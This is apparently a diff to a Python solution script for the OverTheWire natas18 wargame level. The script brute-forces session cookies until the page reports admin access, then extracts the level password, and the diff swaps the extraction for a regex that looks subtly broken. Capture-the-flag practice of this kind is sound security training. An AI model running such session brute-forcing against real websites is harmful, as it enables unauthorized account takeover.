@@ -1,3 +1,4 @@
+import re
 import requests
 from requests.auth import HTTPBasicAuth
 
@@ -15,4 +16,5 @@ while r.text.find('You are an admin') == -1:
     print(count)
     r = requests.get('http://natas18.natas.labs.overthewire.org', auth=auth, params=param, cookies=cook)
     count += 1
-print(r.text[r.text.find('Password: ') + 10:r.text.find('Password: ') + 42])
+    pass_regex = '[a-zA-Z0-9]'
+    print(re.findall(pass_regex, r.text)[1])
